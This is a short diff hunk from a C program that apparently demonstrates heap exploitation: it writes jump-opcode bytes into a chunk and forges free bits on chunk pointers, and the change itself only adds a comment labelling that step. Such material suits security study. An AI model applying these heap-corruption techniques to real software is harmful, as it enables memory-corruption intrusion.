@@ -49,6 +49,7 @@ int main(void)
   strncpy((char*)left_chunk + 1, "\xeb", 1);
   strncpy((char*)left_chunk + 2, "\x0c", 1);
 
+  //Setting up Free Bit
   *(unsigned *)&(left_chunk)->s.right_chunk |=  0x1;
 
   *(unsigned *)&(p)->s.right_chunk |=  0x1;
